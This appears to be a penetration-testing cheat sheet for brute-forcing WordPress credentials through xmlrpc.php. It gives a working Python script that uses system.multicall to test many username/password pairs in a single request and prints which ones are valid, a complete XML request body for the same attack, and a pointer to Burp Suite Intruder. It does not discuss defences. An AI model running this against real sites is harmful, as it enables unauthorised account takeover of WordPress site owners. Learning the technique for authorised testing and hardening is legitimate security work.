### Brute-force WordPress credentials via `xmlrpc.php`

#### Python script using system.multicall

```python
import xmlrpc.client

# Replace this with the target server address.
target_url = "http://target.com/xmlrpc.php"

# A list of login credentials to be tested.
credentials = [
    ("admin", "password1"),
    ("admin", "password2"),
    ("user", "123456"),
    ("test", "test"),
    ("root", "toor")
]

# Setting up requests using system.multicall.
multicall = xmlrpc.client.ServerProxy(target_url).system.multicall

# Preparing requests to test multiple login credentials at once.
requests = [{"methodName": "wp.getUsersBlogs", "params": [user, password]} for user, password in credentials]

try:
    response = multicall(requests)
    for cred, res in zip(credentials, response):
        if isinstance(res, list):
            print(f"[+] Valid credentials found: {cred}")
        else:
            print(f"[-] Invalid credentials: {cred}")
except Exception as e:
    print(f"Error: {e}")
```

#### XML request body for system.multicall

```xml
<?xml version="1.0"?>
<methodCall>
    <methodName>system.multicall</methodName>
    <params>
        <param>
            <value>
                <array>
                    <data>
                        <value>
                            <struct>
                                <member>
                                    <name>methodName</name>
                                    <value><string>wp.getUsersBlogs</string></value>
                                </member>
                                <member>
                                    <name>params</name>
                                    <value>
                                        <array>
                                            <data>
                                                <value><string>user1</string></value>
                                                <value><string>password1</string></value>
                                            </data>
                                        </array>
                                    </value>
                                </member>
                            </struct>
                        </value>
                        <value>
                            <struct>
                                <member>
                                    <name>methodName</name>
                                    <value><string>wp.getUsersBlogs</string></value>
                                </member>
                                <member>
                                    <name>params</name>
                                    <value>
                                        <array>
                                            <data>
                                                <value><string>user2</string></value>
                                                <value><string>password2</string></value>
                                            </data>
                                        </array>
                                    </value>
                                </member>
                            </struct>
                        </value>
                    </data>
                </array>
            </value>
        </param>
    </params>
</methodCall>
```

- You can also use Burp Suite Intruder for brute-forcing.
- If the credentials are valid, the server will return account details.
- If they are invalid, an error message will be returned.
